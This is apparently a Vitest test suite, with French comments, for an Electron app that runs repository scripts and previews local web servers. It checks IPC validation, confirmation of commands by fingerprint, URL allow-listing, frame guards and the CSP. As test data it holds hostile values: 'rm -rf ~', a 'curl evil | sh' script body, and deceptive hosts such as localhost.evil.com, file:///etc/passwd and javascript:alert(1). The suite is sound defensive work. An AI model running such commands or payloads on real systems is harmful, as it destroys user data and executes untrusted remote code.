/**
 * Lot 14a (runners et aperçu web), côté app : validation IPC des méthodes
 * `runners.*` et des requêtes du terminal des runners, lecture des réponses
 * du démon, regroupement et libellés, adresses acceptées ou refusées pour
 * l'aperçu, confirmation retenue par worktree, démon ancien, règle CSP
 * `frame-src`, relais du terminal d'un runner.
 */
import { readFileSync } from 'node:fs'
import path from 'node:path'

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

import { TerminalRelay, type RelayClient } from '../src/main/daemon/relay'
import { RUNNER_STREAM } from '../src/main/daemon/runnerStream'
import { ValidationError, validateParams, validateRunnerConfirm, validateRunnerResize, validateRunnerView } from '../src/main/validate'
import { frameNavigationAllowed, mainFrameUrlAllowed, type FrameNavigation } from '../src/main/frameGuard'
import { checkStart, confirmRunner, describeRunner, type GuardDeps } from '../src/main/runnerGuard'
import { RpcError } from '../src/main/daemon/rpc'
import { ErrorCode } from '../src/shared/protocol'
import type { PortDown } from '../src/shared/bridge'
import { DEV_CSP, FRAME_SRC, PROD_CSP } from '../src/shared/csp'
import { previewLabel, previewUrl } from '../src/shared/preview'
import { RENDERER_METHODS, type Runner, type Snapshot } from '../src/shared/protocol'
import {
  SettingsError,
  defaultSettings,
  normalizeSettings,
  runnerConfirmed,
  validatePatch,
  withRunnerConfirmed,
} from '../src/shared/settings'
import {
  CONFIRM_TEXT,
  KIND_LABELS,
  commandText,
  groupRunners,
  indexReducer,
  initialIndex,
  normalizeList,
  normalizeProcess,
  previewable,
  readConfirmation,
  sessionRunnerCounts,
  runnersIndicator,
  stateLabel,
  stateTone,
} from '../src/renderer/src/state/runners'

const S = '00000000-0000-4000-8000-000000000001'
const P = '11111111-2222-4333-8444-555555555555'
const P2 = '11111111-2222-4333-8444-666666666666'

describe('validation IPC des runners', () => {
  it('les trois méthodes sont permises à la page', () => {
    for (const m of ['runners.list', 'runners.start', 'runners.stop'] as const) expect(RENDERER_METHODS).toContain(m)
  })

  it('runners.list : identifiant de session UUID, champs inconnus retirés', () => {
    expect(validateParams('runners.list', { id: S, extra: 1 })).toEqual({ id: S })
    expect(() => validateParams('runners.list', { id: 'pas-un-uuid' })).toThrow(ValidationError)
    expect(() => validateParams('runners.list', {})).toThrow(ValidationError)
  })

  it('runners.start : seulement un identifiant de runner, jamais une commande venue de la page', () => {
    const clean = validateParams('runners.start', {
      id: S,
      runner_id: 'package.json:dev',
      command: ['sh', '-c', 'rm -rf ~'],
      cwd: '/',
      env: { PATH: '/tmp' },
      // Ajoutée par le processus principal seulement, jamais prise de la page.
      expected_fingerprint: 'f'.repeat(64),
    })
    expect(clean).toEqual({ id: S, runner_id: 'package.json:dev' })
  })

  it('runners.start : identifiant de runner borné, visible, sans caractère de contrôle', () => {
    const ok = (runner_id: unknown) => validateParams('runners.start', { id: S, runner_id })
    expect(ok('Makefile:test').runner_id).toBe('Makefile:test')
    expect(ok('package.json:test unit').runner_id).toBe('package.json:test unit')
    expect(ok('app/package.json:dev').runner_id).toBe('app/package.json:dev')
    expect(ok('x'.repeat(1024)).runner_id).toHaveLength(1024)
    for (const bad of ['', ' dev', 'dev ', 'a\nb', 'a\u0000b', 'a‮b', 'a b', 'x'.repeat(1025), 42, null, ['dev']]) {
      expect(() => ok(bad), JSON.stringify(bad)).toThrow(ValidationError)
    }
    expect(() => validateParams('runners.start', { runner_id: 'dev' })).toThrow(ValidationError)
  })

  it('runners.stop : session et exécution UUID', () => {
    expect(validateParams('runners.stop', { id: S, process_id: P, signal: 'KILL' })).toEqual({ id: S, process_id: P })
    expect(() => validateParams('runners.stop', { id: S, process_id: '1234' })).toThrow(ValidationError)
    expect(() => validateParams('runners.stop', { id: S })).toThrow(ValidationError)
  })

  it('terminal d’un runner : exécution et session, ou rien ; taille bornée', () => {
    expect(validateRunnerView({ session_id: S, process_id: P, cols: 100, rows: 30 })).toEqual({
      session_id: S,
      process_id: P,
      cols: 100,
      rows: 30,
    })
    expect(validateRunnerView({ session_id: null, process_id: null })).toEqual({ session_id: null, process_id: null })
    expect(() => validateRunnerView({ session_id: S, process_id: 'x' })).toThrow(ValidationError)
    expect(() => validateRunnerView({ process_id: P })).toThrow(ValidationError)
    expect(() => validateRunnerView({ session_id: S, process_id: null })).toThrow(ValidationError)
    expect(() => validateRunnerView({ session_id: S, process_id: P, cols: 100 })).toThrow(ValidationError)
    expect(() => validateRunnerView({ session_id: S, process_id: P, cols: 0, rows: 10 })).toThrow(ValidationError)
    expect(validateRunnerResize({ process_id: P, cols: 80, rows: 24, x: 1 })).toEqual({ process_id: P, cols: 80, rows: 24 })
    expect(() => validateRunnerResize({ process_id: P, cols: 1001, rows: 24 })).toThrow(ValidationError)
    expect(validateRunnerConfirm({ session_id: S, runner_id: 'dev', fingerprint: 'a'.repeat(64), x: 1 })).toEqual({
      session_id: S,
      runner_id: 'dev',
      fingerprint: 'a'.repeat(64),
    })
    expect(() => validateRunnerConfirm({ session_id: S, runner_id: 'dev', fingerprint: 'A'.repeat(64) })).toThrow(ValidationError)
    expect(() => validateRunnerConfirm({ session_id: S, runner_id: 'dev' })).toThrow(ValidationError)
  })
})

describe('réponses du démon', () => {
  const proc = { process_id: P, runner_id: 'dev', session_id: S, port: 41000, started_at: '2026-10-21T10:00:00Z', state: 'running', exit_code: null, urls: ['http://localhost:41000/'] }

  it('exécution : identifiant process_id (UUID), champs bornés', () => {
    expect(normalizeProcess(proc)).toMatchObject({ processId: P, runnerId: 'dev', state: 'running', port: 41000, exitCode: null, label: null })
    expect(normalizeProcess({ ...proc, label: 'dev', command: ['pnpm', 'dev'] })).toMatchObject({ label: 'dev', command: ['pnpm', 'dev'] })
    expect(normalizeProcess({ ...proc, process_id: 'pas-un-uuid' })).toBeNull()
    expect(normalizeProcess({ ...proc, process_id: undefined, pid_id: P })).toBeNull()
    expect(normalizeProcess({ ...proc, state: 'zombie' })).toBeNull()
    expect(normalizeProcess({ ...proc, runner_id: '' })).toBeNull()
    expect(normalizeProcess(null)).toBeNull()
    expect(normalizeProcess({ ...proc, state: 'exited', exit_code: 2 })).toMatchObject({ state: 'exited', exitCode: 2, signal: null })
    expect(normalizeProcess({ ...proc, state: 'exited', exit_code: null, signal: 9 })).toMatchObject({ signal: '9' })
    expect(normalizeProcess({ ...proc, signal: '<b>' })?.signal).toBeNull()
  })

  it('liste : entrées invalides écartées, doublons retirés, type inconnu → autres', () => {
    const r = normalizeList({
      runners: [
        { id: 'dev', label: 'dev', kind: 'dev', command: ['pnpm', 'run', 'dev'], cwd: '', source: 'package.json:scripts.dev', body: 'vite', fingerprint: 'b'.repeat(64) },
        { id: 'dev', label: 'doublon', kind: 'dev', command: ['x'], cwd: '', source: '' },
        { id: 'vide', label: 'vide', kind: 'dev', command: [], cwd: '', source: '' },
        { id: 'bizarre', label: '', kind: 'deploy', command: ['make', 'deploy'], cwd: '', source: 'Makefile:deploy' },
        'n’importe quoi',
      ],
      running: [proc, proc, { nope: true }],
    })
    expect(r.runners.map((x) => x.id)).toEqual(['dev', 'bizarre'])
    expect(r.runners[0]).toMatchObject({ body: 'vite', fingerprint: 'b'.repeat(64) })
    expect(r.runners[1]).toMatchObject({ kind: 'other', label: 'bizarre', body: null })
    expect(r.runners[1]!.fingerprint).toBeUndefined()
    expect(r.running).toHaveLength(1)
    expect(normalizeList(undefined)).toEqual({ runners: [], running: [] })
  })
})

describe('regroupement et libellés', () => {
  const R = (id: string, kind: Runner['kind'], command: string[], cwd = ''): Runner => ({ id, label: id, kind, command, cwd, source: '' })

  it('groupes dans l’ordre dev, test, build, lint, autres ; groupes vides omis', () => {
    const g = groupRunners([R('lint', 'lint', ['pnpm', 'lint']), R('a', 'other', ['x']), R('dev', 'dev', ['pnpm', 'dev']), R('t', 'test', ['cargo', 'test'])])
    expect(g.map((x) => x.label)).toEqual(['Développement', 'Tests', 'Vérifications', 'Autres'])
    expect(KIND_LABELS.build).toBe('Construction')
  })

  it('commande affichée telle qu’exécutée (apostrophes si besoin, dossier)', () => {
    expect(commandText(R('a', 'dev', ['pnpm', 'run', 'dev']))).toBe('pnpm run dev')
    expect(commandText(R('a', 'test', ['npm', 'run', 'test unit']))).toBe("npm run 'test unit'")
    expect(commandText(R('a', 'other', ['echo', "l'été", '$HOME']))).toBe(`echo 'l'\\''été' '$HOME'`)
    expect(commandText(R('a', 'dev', ['cargo', 'run', '-p', 'orchd'], 'crates/core'))).toBe('(cd crates/core && cargo run -p orchd)')
    expect(commandText(R('a', 'dev', ['go', 'run', '.'], '.'))).toBe('go run .')
    expect(commandText(R('a', 'dev', ['go', 'run', '.'], './'))).toBe('go run .')
  })

  it('état, code de sortie et indicateur', () => {
    expect(stateLabel({ state: 'running', exitCode: null })).toBe('En cours')
    expect(stateLabel({ state: 'exited', exitCode: 0 })).toBe('Terminé (code 0)')
    expect(stateLabel({ state: 'exited', exitCode: 137 })).toBe('Échec (code 137)')
    expect(stateLabel({ state: 'exited', exitCode: null })).toBe('Arrêté')
    expect(stateLabel({ state: 'exited', exitCode: null, signal: '15' })).toBe('Arrêté (signal 15)')
    expect(stateTone({ state: 'exited', exitCode: 1 })).toBe('err')
    expect(runnersIndicator(0)).toBeNull()
    expect(runnersIndicator(1)).toBe('1 runner en cours')
    expect(runnersIndicator(3)).toBe('3 runners en cours')
  })

  it('texte de confirmation ; commande à faire accepter lue du refus du processus principal', () => {
    const c = { worktree: '/w/a', runner_id: 'dev', label: 'dev', command: ['pnpm', 'run', 'dev'], cwd: '', source: 'package.json:dev', body: 'vite', fingerprint: 'c'.repeat(64) }
    // Démon d'avant les fichiers de l'empreinte : extrait non coupé, liste des fichiers inconnue.
    expect(readConfirmation(c)).toEqual({ ...c, body_truncated: false, files: null })
    expect(readConfirmation({ ...c, body: 3 })?.body).toBeNull()
    expect(readConfirmation({ ...c, fingerprint: 'court' })).toBeNull()
    expect(readConfirmation({ ...c, command: [] })).toBeNull()
    expect(readConfirmation(null)).toBeNull()
    expect(CONFIRM_TEXT).toContain('Cette commande vient du dépôt et va s’exécuter sur ta machine')
  })
})

describe('aperçu web : adresses acceptées et refusées', () => {
  it('accepte localhost, 127.0.0.1 et [::1] en http, port explicite ou implicite (80)', () => {
    expect(previewUrl('http://localhost/')).toBe('http://localhost/')
    expect(previewUrl('http://localhost:80/')).toBe('http://localhost/')
    expect(previewUrl('http://127.0.0.1/app')).toBe('http://127.0.0.1/app')
    expect(previewLabel('http://localhost/')).toBe('localhost')
    expect(previewUrl('http://localhost:5173')).toBe('http://localhost:5173/')
    expect(previewUrl('http://127.0.0.1:41000/app?x=1#h')).toBe('http://127.0.0.1:41000/app?x=1#h')
    // IPv6 : affiché par localhost (Chromium refuse `http://[::1]:*` dans une règle CSP).
    expect(previewUrl('http://[::1]:8080/a?b')).toBe('http://localhost:8080/a?b')
    expect(previewUrl('HTTP://LOCALHOST:3000/')).toBe('http://localhost:3000/')
    // Formes équivalentes normalisées par URL : comparées après analyse.
    expect(previewUrl('http://[0:0:0:0:0:0:0:1]:8080/')).toBe('http://localhost:8080/')
    expect(previewUrl('http://127.1:3000/')).toBe('http://127.0.0.1:3000/')
  })

  it('refuse les hôtes trompeurs', () => {
    for (const u of [
      'http://localhost.evil.com:3000/',
      'http://127.0.0.1.nip.io:3000/',
      'http://localhost.:3000/',
      'http://evil-localhost:3000/',
      'http://127.0.0.2:3000/',
      'http://0.0.0.0:3000/',
      'http://[::ffff:127.0.0.1]:3000/',
      'http://[::2]:3000/',
      'http://192.168.1.10:3000/',
      'http://evil.com/?u=http://localhost:3000',
      'http://evil.com#@localhost:3000',
    ]) {
      expect(previewUrl(u), u).toBeNull()
    }
  })

  it('refuse les identifiants dans l’adresse (userinfo@)', () => {
    expect(previewUrl('http://user:pass@localhost:3000/')).toBeNull()
    expect(previewUrl('http://localhost@evil.com:3000/')).toBeNull()
    expect(previewUrl('http://localhost:3000@evil.com/')).toBeNull()
    expect(previewUrl('http://evil.com@localhost:3000/')).toBeNull()
  })

  it('refuse les autres schémas et les valeurs invalides', () => {
    for (const u of [
      'https://localhost:3000/',
      'ws://localhost:3000/',
      'file:///etc/passwd',
      'javascript:alert(1)',
      'data:text/html,<b>x</b>',
      'localhost:3000',
      '',
      `http://localhost:3000/${'a'.repeat(3000)}`,
      42,
      null,
    ]) {
      expect(previewUrl(u), String(u)).toBeNull()
    }
  })

  it('refuse l’origine de la page de l’app (développement : même origine = accès à la page)', () => {
    expect(previewUrl('http://localhost:5173/', 'http://localhost:5173')).toBeNull()
    expect(previewUrl('http://localhost:5173/autre', 'http://localhost:5173')).toBeNull()
    expect(previewUrl('http://[::1]:5173/', 'http://localhost:5173')).toBeNull()
    expect(previewUrl('http://127.0.0.1:5173/', 'http://localhost:5173')).toBe('http://127.0.0.1:5173/')
    expect(previewUrl('http://localhost:5174/', 'http://localhost:5173')).toBe('http://localhost:5174/')
    // Production (file://) : origine opaque, rien à exclure.
    expect(previewUrl('http://localhost:5173/', 'null')).toBe('http://localhost:5173/')
  })

  it('URL d’une exécution : celles de l’aperçu, normalisées et dédoublonnées', () => {
    expect(previewable(['http://localhost:3000', 'http://localhost:3000/', 'http://localhost.evil.com:3000/', 'https://x.dev'], null)).toEqual([
      'http://localhost:3000/',
    ])
    expect(previewLabel('http://localhost:3000/')).toBe('localhost:3000')
    expect(previewLabel('http://127.0.0.1:3000/app')).toBe('127.0.0.1:3000/app')
    expect(previewable(['http://[::1]:3000/'], null)).toEqual(['http://localhost:3000/'])
  })
})

describe('confirmation retenue par worktree et empreinte (réglages)', () => {
  const F1 = '1'.repeat(64)
  const F2 = '2'.repeat(64)

  it('absente par défaut, retenue par le processus principal, par (worktree, empreinte)', () => {
    const d = defaultSettings()
    expect(d.runners).toEqual({ confirmed: {} })
    expect(runnerConfirmed(d, '/w/a', F1)).toBe(false)
    const a = withRunnerConfirmed(d, '/w/a', F1)
    expect(runnerConfirmed(a, '/w/a', F1)).toBe(true)
    // Commande changée (autre empreinte) ou autre worktree : redemandée.
    expect(runnerConfirmed(a, '/w/a', F2)).toBe(false)
    expect(runnerConfirmed(a, '/w/b', F1)).toBe(false)
    expect(runnerConfirmed(a, null, F1)).toBe(false)
    const b = withRunnerConfirmed(withRunnerConfirmed(a, '/w/a', F2), '/w/a', F1)
    expect(b.runners.confirmed['/w/a']).toEqual([F2, F1])
    expect(() => withRunnerConfirmed(d, 'relatif', F1)).toThrow(SettingsError)
    expect(() => withRunnerConfirmed(d, '/w/a', 'court')).toThrow(SettingsError)
    expect(runnerConfirmed({ runners: { confirmed: {} } }, '__proto__', F1)).toBe(false)
  })

  it('la page ne peut pas écrire les commandes acceptées', () => {
    for (const bad of [{ runners: { confirmed: { '/w/a': [F1] } } }, { runners: { confirmed: { '/w/a': true } } }, { runners: {} }]) {
      expect(() => validatePatch(bad), JSON.stringify(bad)).toThrow(SettingsError)
    }
  })

  it('lecture tolérante du fichier ; ancien format (true sans empreinte) oublié', () => {
    const s = normalizeSettings({ runners: { confirmed: { '/w/a': [F1, F1, 'x'], '/w/b': true, rel: [F1], '/w/c': [] } } })
    expect(s.runners.confirmed).toEqual({ '/w/a': [F1] })
    expect(normalizeSettings({}).runners).toEqual({ confirmed: {} })
    expect(normalizeSettings({ runners: 'x' }).runners).toEqual({ confirmed: {} })
  })
})

describe('confirmation tenue par le processus principal (runners.start)', () => {
  const FP = 'd'.repeat(64)
  const runner = { id: 'package.json:dev', label: 'dev', kind: 'dev', command: ['pnpm', 'run', 'dev'], cwd: '', source: 'package.json:dev', body: 'vite --port $PORT', fingerprint: FP }

  function deps(over: { runners?: unknown[]; worktreeRoot?: string | null } = {}) {
    const confirmed = new Set<string>()
    const calls: [string, unknown][] = []
    const d: GuardDeps = {
      async request(method, params) {
        calls.push([method, params])
        if (method === 'sessions.get') return { session: { id: S, cwd: '/w/alpha/app' } }
        if (method === 'projects.resolve') return { worktree_root: over.worktreeRoot === undefined ? '/w/alpha' : over.worktreeRoot }
        if (method === 'runners.list') return { runners: over.runners ?? [runner], running: [] }
        throw new Error(method)
      },
      isConfirmed: (w, f) => confirmed.has(`${w}#${f}`),
      async remember(w, f) {
        confirmed.add(`${w}#${f}`)
      },
    }
    return { d, confirmed, calls }
  }

  it('refuse tant que la commande n’est pas acceptée ; le refus porte commande et corps', async () => {
    const { d } = deps()
    const err = await checkStart(d, S, runner.id).catch((e: unknown) => e)
    expect(err).toBeInstanceOf(RpcError)
    expect((err as RpcError).code).toBe(ErrorCode.RunnerConfirmationRequired)
    expect((err as RpcError).data).toEqual({
      worktree: '/w/alpha',
      runner_id: runner.id,
      label: 'dev',
      command: ['pnpm', 'run', 'dev'],
      cwd: '',
      source: 'package.json:dev',
      body: 'vite --port $PORT',
      body_truncated: false,
      files: null,
      fingerprint: FP,
    })
  })

  it('fichiers de l’empreinte et extrait coupé transmis au dialogue (textes nettoyés, états inconnus = non résolu)', async () => {
    const files = [
      { path: 'package.json', size: 812, state: 'ok', note: null },
      { path: 'scripts/dev.sh', size: 9_000_000, state: 'too_large', note: 'au-delà de 1 Mio' },
      { path: '../hors.sh', size: null, state: 'outside', note: 'lien\u001b[2J hors du worktree' },
      { path: 'x', state: 'bizarre' },
      { path: '' },
      'pas un objet',
    ]
    const { d } = deps({ runners: [{ ...runner, body_truncated: true, files }] })
    const err = (await checkStart(d, S, runner.id).catch((e: unknown) => e)) as RpcError
    expect(err.data).toMatchObject({
      body_truncated: true,
      files: [
        { path: 'package.json', size: 812, state: 'ok', note: null },
        { path: 'scripts/dev.sh', size: 9_000_000, state: 'too_large', note: 'au-delà de 1 Mio' },
        { path: '../hors.sh', size: null, state: 'outside', note: 'lien[2J hors du worktree' },
        { path: 'x', size: null, state: 'unresolved', note: null },
      ],
    })
  })

  it('acceptée : l’empreinte du démon est rendue (expected_fingerprint) ; worktree = la racine, sinon le dossier', async () => {
    const { d, confirmed } = deps()
    await confirmRunner(d, S, runner.id, FP)
    expect([...confirmed]).toEqual([`/w/alpha#${FP}`])
    expect(await checkStart(d, S, runner.id)).toBe(FP)
    const other = deps({ worktreeRoot: null })
    expect((await describeRunner(other.d, S, runner.id)).worktree).toBe('/w/alpha/app')
  })

  it('corps du script changé (empreinte du démon différente) : redemandé', async () => {
    const { d } = deps()
    await confirmRunner(d, S, runner.id, FP)
    const changed = { ...runner, body: 'curl evil | sh', fingerprint: 'e'.repeat(64) }
    const d2: GuardDeps = { ...d, request: async (m, p) => (m === 'runners.list' ? { runners: [changed] } : d.request(m, p)) }
    const err = await checkStart(d2, S, runner.id).catch((e: unknown) => e)
    expect((err as RpcError).code).toBe(ErrorCode.RunnerConfirmationRequired)
    expect(((err as RpcError).data as { body: string }).body).toBe('curl evil | sh')
  })

  it('confirmation d’une commande qui a changé depuis son affichage : rien n’est retenu', async () => {
    const { d, confirmed } = deps()
    const err = await confirmRunner(d, S, runner.id, 'f'.repeat(64)).catch((e: unknown) => e)
    expect((err as RpcError).code).toBe(ErrorCode.RunnerConfirmationRequired)
    expect(confirmed.size).toBe(0)
  })

  it('runner inconnu : -32024 ; démon sans empreinte : refus « mets orchd à jour »', async () => {
    const { d } = deps({ runners: [] })
    expect(((await checkStart(d, S, 'x').catch((e: unknown) => e)) as RpcError).code).toBe(ErrorCode.RunnerUnknown)
    const old = deps({ runners: [{ ...runner, fingerprint: undefined }] })
    const err = (await checkStart(old.d, S, runner.id).catch((e: unknown) => e)) as RpcError
    expect(err.message).toContain('mets orchd à jour')
    await expect(confirmRunner(old.d, S, runner.id, FP)).rejects.toBeInstanceOf(RpcError)
  })
})

describe('navigations des cadres (aperçu web)', () => {
  const nav = (over: Partial<FrameNavigation>): boolean =>
    frameNavigationAllowed({ url: 'http://localhost:3000/', isMainFrame: false, hasFrame: true, directChild: true, pageUrl: 'file:///app/index.html', ...over })
  const DEV = 'http://localhost:5173/'

  it('cadre principal : seulement le rechargement de la même adresse (une redirection de l’aperçu n’y est pas comparée)', () => {
    expect(mainFrameUrlAllowed('file:///app/index.html#x', 'file:///app/index.html')).toBe(true)
    expect(nav({ isMainFrame: true, url: 'http://localhost:3000/' })).toBe(false)
    expect(nav({ isMainFrame: true, url: 'file:///app/index.html' })).toBe(true)
    // Redirection 302 de l'iframe vers une autre page du serveur local : permise.
    expect(nav({ url: 'http://localhost:3000/login' })).toBe(true)
  })

  it('l’origine de la page de l’app est refusée à toute profondeur', () => {
    expect(nav({ pageUrl: DEV, url: 'http://localhost:5173/' })).toBe(false)
    expect(nav({ pageUrl: DEV, url: 'http://localhost:5173/', directChild: false })).toBe(false)
    expect(nav({ pageUrl: DEV, url: 'blob:http://localhost:5173/1234', directChild: false })).toBe(false)
    expect(nav({ pageUrl: DEV, url: 'http://localhost:3000/', directChild: false })).toBe(true)
  })

  it('cadre inconnu, file: : refusés ; cadres profonds : leur propre politique', () => {
    expect(nav({ hasFrame: false })).toBe(false)
    expect(nav({ url: 'file:///etc/passwd', directChild: false })).toBe(false)
    expect(nav({ url: 'https://js.stripe.com/v3/', directChild: false })).toBe(true)
    expect(nav({ url: 'pas une url', directChild: false })).toBe(false)
  })

  it('iframe de l’aperçu : seulement une adresse d’aperçu ou une page vide (blob:/data: refusés, comme par la CSP)', () => {
    expect(nav({ url: 'http://127.0.0.1:3000/x' })).toBe(true)
    expect(nav({ url: 'http://localhost/' })).toBe(true)
    expect(nav({ url: 'about:blank' })).toBe(true)
    expect(nav({ url: 'https://evil.com/' })).toBe(false)
    expect(nav({ url: 'http://localhost.evil.com:3000/' })).toBe(false)
    expect(nav({ url: 'blob:http://localhost:3000/1234' })).toBe(false)
    expect(nav({ url: 'data:text/html,<b>x</b>' })).toBe(false)
  })
})

describe('indicateur et démon ancien', () => {
  const run = (id: string, state: 'running' | 'exited') => normalizeProcess({ process_id: id, runner_id: 'dev', session_id: S, port: null, started_at: '', state, exit_code: null, urls: [] })!

  it('compte : Session.runners_running fait foi, sinon la dernière liste connue', () => {
    let s = indexReducer(initialIndex, { type: 'list', sessionId: 'A', running: [run(P, 'running'), run(P2, 'exited')] })
    s = indexReducer(s, { type: 'list', sessionId: 'B', running: [run(P, 'running')] })
    expect(s.supported).toBe(true)
    const sessions = [{ id: 'A' }, { id: 'B', runners_running: 0 }, { id: 'C', runners_running: 2 }]
    expect(sessionRunnerCounts(sessions, s)).toEqual({ A: 1, C: 2 })
    s = indexReducer(s, { type: 'forget', sessionId: 'A' })
    expect(sessionRunnerCounts(sessions, s)).toEqual({ C: 2 })
  })

  it('démon sans runners (-32601) : non pris en charge, plus rien de connu ; nouvelle connexion : redemandé', () => {
    let s = indexReducer(initialIndex, { type: 'list', sessionId: 'A', running: [run(P, 'running')] })
    s = indexReducer(s, { type: 'unsupported' })
    expect(s).toEqual({ supported: false, running: {} })
    expect(indexReducer(s, { type: 'reset' })).toEqual({ supported: null, running: {} })
  })
})

describe('règle CSP de la fenêtre', () => {
  const html = readFileSync(path.join(__dirname, '../src/renderer/index.html'), 'utf8')
  const meta = /<meta http-equiv="Content-Security-Policy" content="([^"]*)"/.exec(html)?.[1]

  const directives = (csp: string) => Object.fromEntries(csp.split(';').map((d) => d.trim().split(/\s+/)).map(([k, ...v]) => [k!, v.join(' ')]))

  it('index.html porte exactement la politique de production', () => {
    expect(meta).toBe(PROD_CSP)
  })

  it('frame-src limité aux serveurs de la machine en http (sans source IPv6, refusée par Chromium)', () => {
    expect(FRAME_SRC).toBe('frame-src http://localhost:* http://127.0.0.1:*')
    expect(directives(PROD_CSP)['frame-src']).toBe('http://localhost:* http://127.0.0.1:*')
    expect(directives(DEV_CSP)['frame-src']).toBe('http://localhost:* http://127.0.0.1:*')
    expect(PROD_CSP).not.toContain('[::1]')
  })

  it('toute adresse acceptée par l’aperçu est permise par frame-src', () => {
    for (const u of ['http://localhost:1/', 'http://127.0.0.1:2/', 'http://[::1]:3/']) {
      const host = new URL(previewUrl(u)!).hostname
      expect(['localhost', '127.0.0.1'], u).toContain(host)
    }
  })

  it('rien d’autre n’est relâché', () => {
    expect(directives(PROD_CSP)).toEqual({
      'default-src': "'none'",
      'script-src': "'self'",
      'style-src': "'self' 'unsafe-inline'",
      'font-src': "'self'",
      'img-src': "'self' data:",
      'connect-src': "'none'",
      'base-uri': "'none'",
      'form-action': "'none'",
      'frame-src': 'http://localhost:* http://127.0.0.1:*',
      'object-src': "'none'",
    })
    expect(directives(DEV_CSP)['connect-src']).toBe("'self' ws://localhost:* ws://127.0.0.1:*")
    for (const csp of [PROD_CSP, DEV_CSP]) {
      expect(csp).not.toMatch(/https:|\bframe-ancestors\b|child-src|\s\*(\s|;|$)/)
    }
  })
})

describe('relais du terminal d’un runner', () => {
  const snap = (ansi: string): Snapshot => ({ cols: 80, rows: 24, cursor: { row: 0, col: 0, visible: true }, ansi, text: '' })
  let posted: PortDown[]
  beforeEach(() => {
    vi.useFakeTimers()
    posted = []
  })
  afterEach(() => vi.useRealTimers())

  function make() {
    const calls: { method: string; params: unknown; onResult?: (r: unknown) => void; resolve: (r: unknown) => void }[] = []
    const inputs: [string, number[]][] = []
    const client: RelayClient = {
      request(method, params, _t, onResult) {
        return new Promise((resolve) => calls.push({ method, params, onResult: onResult as (r: unknown) => void, resolve: resolve as (r: unknown) => void }))
      },
      sendInput(id, data) {
        inputs.push([id, [...data]])
        return true
      },
    }
    const relay = new TerminalRelay(client, { methods: RUNNER_STREAM, minBatchBytes: 4 })
    relay.setSink({ post: (m) => posted.push(m) })
    const respond = (method: string, result: unknown) => {
      const c = calls.find((x) => x.method === method && !(x as { done?: boolean }).done)!
      ;(c as { done?: boolean }).done = true
      c.onResult?.(result)
      c.resolve(result)
    }
    return { relay, calls, inputs, respond }
  }

  it('s’abonne par runners.* avec la session et l’exécution ; octets, touches, resync, changement', async () => {
    const { relay, calls, inputs, respond } = make()
    const p = relay.view({ id: P, owner: S, cols: 100, rows: 30 })
    expect(calls.map((c) => [c.method, c.params])).toEqual([
      ['runners.resize', { id: S, process_id: P, cols: 100, rows: 30 }],
      ['runners.subscribe', { id: S, process_id: P }],
    ])
    respond('runners.subscribe', { snapshot: snap('écran') })
    await p
    relay.onPty(P, Buffer.from('sortie'))
    relay.onPty(S, Buffer.from('session')) // autre terminal : ignoré
    expect(posted.map((m) => m.t)).toEqual(['reset', 'data'])
    relay.input(P, new Uint8Array([3]))
    relay.input(P2, new Uint8Array([3])) // pas l'exécution affichée
    expect(inputs).toEqual([[P, [3]]])
    // Une resynchronisation de session (même avec l'identifiant de l'exécution) n'est pas pour ce relais.
    relay.onNotification({ method: 'session.resync', params: { id: P, snapshot: snap('x') } })
    relay.onNotification({ method: 'runners.resync', params: { process_id: P2, snapshot: snap('x') } })
    expect(posted).toHaveLength(2)
    relay.onNotification({ method: 'runners.resync', params: { process_id: P, snapshot: snap('neuf') } })
    expect(posted[2]).toMatchObject({ t: 'reset', reason: 'resync' })
    relay.resize(P, 90, 20)
    relay.resize(P2, 90, 20)
    expect(calls.at(-1)).toMatchObject({ method: 'runners.resize', params: { id: S, process_id: P, cols: 90, rows: 20 } })
    void relay.view({ id: null })
    expect(calls.at(-1)).toMatchObject({ method: 'runners.unsubscribe', params: { id: S, process_id: P } })
    expect(posted.at(-1)).toMatchObject({ t: 'none' })
  })
})
